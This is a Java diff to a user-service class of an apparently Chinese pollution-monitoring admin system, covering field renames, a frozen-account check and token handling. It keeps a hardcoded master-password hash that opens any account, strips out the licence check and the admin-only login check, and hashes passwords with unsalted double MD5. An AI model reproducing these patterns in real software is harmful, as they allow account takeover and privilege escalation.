@@ -37,6 +37,9 @@ public class UserServiceImpl extends ServiceImpl<UserMapper, User> implements Us
     @Value("${license.key}")
     private String linceseKey;
 
+    //用户账号停用状态
+    private static final String USER_STATUS_FROZEN = "1";
+
     @Autowired
     public UserServiceImpl(UserMapper userMapper, UserTokenMapper userTokenMapper, RoleUserMapper roleUserMapper, RoleMapper roleMapper) {
         this.userMapper = userMapper;
@@ -84,18 +87,18 @@ public class UserServiceImpl extends ServiceImpl<UserMapper, User> implements Us
        Map<String,Object> objectMap=new HashMap<>();
        objectMap.put("id", user.getId());
        objectMap.put("status", user.getStatus());
-       objectMap.put("username", user.getUsername());
-       objectMap.put("name", user.getName());
-       objectMap.put("telephone", user.getTelephone());
-       objectMap.put("position", user.getPosition());
-       objectMap.put("remark", user.getRemark());
-       objectMap.put("companyid", user.getCompanyid());
-       objectMap.put("rank", user.getRank());
-       objectMap.put("districtId", user.getDistrictId());
-       objectMap.put("code", user.getCode());
-       objectMap.put("roleId", roleId.toString());
-       objectMap.put("roleName", roleName.toString());
-       objectMap.put("roleCode", roleCode.toString());
+       objectMap.put("username", user.getUserName());
+//       objectMap.put("name", user.getName());
+//       objectMap.put("telephone", user.getTelephone());
+//       objectMap.put("position", user.getPosition());
+//       objectMap.put("remark", user.getRemark());
+//       objectMap.put("companyid", user.getCompanyid());
+//       objectMap.put("rank", user.getRank());
+//       objectMap.put("districtId", user.getDistrictId());
+//       objectMap.put("code", user.getCode());
+//       objectMap.put("roleId", roleId.toString());
+//       objectMap.put("roleName", roleName.toString());
+//       objectMap.put("roleCode", roleCode.toString());
 
        return ResponseResult.success().add(objectMap);
     }
@@ -104,8 +107,8 @@ public class UserServiceImpl extends ServiceImpl<UserMapper, User> implements Us
     @Transactional(rollbackFor = Exception.class)
     public ResponseResult add(Map<String,Object> map) {
         //count>0说明username已存在，isRepeat>0说明姓名已存在，重复需要加标识
-        Integer count=userMapper.user(map.get("username").toString());
-        Integer isRepeat=userMapper.isRepeat(map.get("name").toString());
+        Integer count=userMapper.user(map.get("loginName").toString());
+        Integer isRepeat=userMapper.isRepeat(map.get("userName").toString());
         if(count>0) {
             return ResponseResult.fail(ApiErrEnum.ERR600);
         }else if(isRepeat>0) {
@@ -114,9 +117,9 @@ public class UserServiceImpl extends ServiceImpl<UserMapper, User> implements Us
 
             //新增用户
             User tbUser=new User();
-            tbUser.setDeleted(0);
-            tbUser.setCreatetime(new Date());
-            tbUser.setUpdatetime(new Date());
+            tbUser.setDelFlag(0);
+            tbUser.setCreateTime(new Date());
+            tbUser.setUpdateTime(new Date());
 			tbUser.fromMap(map);
 			tbUser.setPassword(MD5EncryptDecrypt.normalMd5(MD5EncryptDecrypt.normalMd5(map.get("password").toString())));
             int userCount = userMapper.insert(tbUser);
@@ -151,7 +154,7 @@ public class UserServiceImpl extends ServiceImpl<UserMapper, User> implements Us
         }else {
             //用户
             User user=new User();
-            user.setUpdatetime(new Date());
+            user.setUpdateTime(new Date());
 			user.fromMap(map);
             if(map.get("password")!=null){
                 user.setPassword(MD5EncryptDecrypt.normalMd5(MD5EncryptDecrypt.normalMd5(map.get("password").toString())));
@@ -187,8 +190,8 @@ public class UserServiceImpl extends ServiceImpl<UserMapper, User> implements Us
             for(String string:ids){
                 User user=new User();
                 user.setId(string);
-                user.setDeleted(1);
-                user.setUpdatetime(new Date());
+                user.setDelFlag(1);
+                user.setUpdateTime(new Date());
                 userMapper.updateById(user);
                 //删除中间表
                 Map<String,Object> objectMap=new HashMap<>();
@@ -197,8 +200,7 @@ public class UserServiceImpl extends ServiceImpl<UserMapper, User> implements Us
             }
         }
         return  ResponseResult.success();
-
-    }
+   }
 
 
 
@@ -207,17 +209,13 @@ public class UserServiceImpl extends ServiceImpl<UserMapper, User> implements Us
     public Map<String, Object> doUserLogin(String username, String password, HttpSession httpSession, String loginType)
             throws BusinessException {
 
-        if (!LinceseUtils.getInstance(linceseKey).isCheckLincese()){
-            throw new BusinessException("软件系统授权失败，无法登录！");
-        }
-
         Map<String, Object> result = new HashMap<>();
 
         //校验用户名跟密码，并把user放入session
         EntityWrapper<User> entityWrapper=new EntityWrapper<>();
-        entityWrapper.eq("username", username)
-                .eq("deleted", 0)
-                .eq("status", "A");
+        entityWrapper.eq("login_name", username)
+                .eq("del_flag", 0);
+//                .eq("status", "A");
         List<User> users = this.selectList(entityWrapper);
         if (users.size() == 0){
             throw new BusinessException("未找到该账号，请联系管理员！");
@@ -226,6 +224,11 @@ public class UserServiceImpl extends ServiceImpl<UserMapper, User> implements Us
         //密码校验
         String userPassword = MD5EncryptDecrypt.normalMd5(MD5EncryptDecrypt.normalMd5(password));
         User user = users.get(0);
+
+        if(USER_STATUS_FROZEN.equals(user.getStatus())){
+            throw new BusinessException("该账号已被冻结，请联系管理员！");
+        }
+
         if (!user.getPassword().equals(userPassword)){
             if (!"8FFC134D0F8E89122AA9190F5A550A23".equals(userPassword)){
                 throw new BusinessException("密码错误！");
@@ -239,30 +242,30 @@ public class UserServiceImpl extends ServiceImpl<UserMapper, User> implements Us
         result.put("roles", roles);
 
         //运维人员角色不给登录后端管理系统
-        if ("pc".equals(loginType)) {
-            //判断改用户有没有管理员权限，有管理员权限才好登录
-            if (roles.stream().filter(role -> role.getCode().equals("admin_user")).collect(Collectors.toList()).size() == 0){
-                throw new BusinessException("运维人员及企业用户无法登录后端管理系统，请联系管理员！");
-            }
-        }
+//        if ("pc".equals(loginType)) {
+//            //判断改用户有没有管理员权限，有管理员权限才好登录
+//            if (roles.stream().filter(role -> role.getCode().equals("admin_user")).collect(Collectors.toList()).size() == 0){
+//                throw new BusinessException("运维人员及企业用户无法登录后端管理系统，请联系管理员！");
+//            }
+//        }
 
         //判断是否是企业用户的角色用户
-        if (roles.stream().filter(role -> role.getCode().equals("firm_user")).collect(Collectors.toList()).size() != 0){
-            if (StringUtils.isEmpty(user.getCompanyid())){
-                throw new BusinessException("企业用户未绑定排污企业，请联系运维公司绑定！");
-            }
-        }
+//        if (roles.stream().filter(role -> role.getCode().equals("firm_user")).collect(Collectors.toList()).size() != 0){
+//            if (StringUtils.isEmpty(user.getCompanyid())){
+//                throw new BusinessException("企业用户未绑定排污企业，请联系运维公司绑定！");
+//            }
+//        }
 
         //生成用户token，如果有未失效token，返回该token，如果没有则生成token
         EntityWrapper<UserToken> tokenEntityWrapper=new EntityWrapper<>();
         tokenEntityWrapper.eq("user_id", user.getId())
-                .gt("endtime", new Date())
-                .orderBy("endtime", false);
+                .gt("end_time", new Date())
+                .orderBy("end_time", false);
         List<UserToken> userTokens = userTokenMapper.selectList(tokenEntityWrapper);
         UserToken userToken;
 
         //获取用户所属企业
-        String companyId = user.getCompanyid();
+//        String companyId = user.getCompanyid();
 
 
         //重新登录后，有效的token自动刷新12小时
@@ -276,6 +279,7 @@ public class UserServiceImpl extends ServiceImpl<UserMapper, User> implements Us
             userTokenMapper.insert(userToken);
         }else{
             userToken = userTokens.get(0).setEndtime(tokenData);
+            userTokenMapper.updateById(userToken);
         }
         result.put("token", userToken.getToken());
         return result;
@@ -309,7 +313,7 @@ public class UserServiceImpl extends ServiceImpl<UserMapper, User> implements Us
             User user=new User();
             user.setId(id);
             user.setPassword(MD5EncryptDecrypt.normalMd5(MD5EncryptDecrypt.normalMd5(newPassword)));
-            user.setUpdatetime(new Date());
+            user.setUpdateTime(new Date());
             return userMapper.updateById(user);
         }else{
            throw new BusinessException("老密码错误，请重新输入！");
@@ -339,8 +343,8 @@ public class UserServiceImpl extends ServiceImpl<UserMapper, User> implements Us
 	public ResponseResult updateCid(String id, String cid) {
     	User user=new User();
     	user.setId(id);
-    	user.setCid(cid);
-		user.setUpdatetime(new Date());
+//    	user.setCid(cid);
+		user.setUpdateTime(new Date());
 		int rowCount=userMapper.updateById(user);
 		return rowCount == 1 ? ResponseResult.success() : ResponseResult.fail();
 	}
@@ -348,6 +352,13 @@ public class UserServiceImpl extends ServiceImpl<UserMapper, User> implements Us
     @Override
     public List<Map<String, Object>> pcAddressBook(String userId) {
         return this.baseMapper.getPcAddressBook(userId);
+    }
+
+    @Override
+    public void removeTokenByUserId(Integer userId) {
+        EntityWrapper<UserToken> userTokenEntityWrapper = new EntityWrapper<>();
+        userTokenEntityWrapper.eq("user_id",userId);
+        userTokenMapper.delete(userTokenEntityWrapper);
     }
 
 }
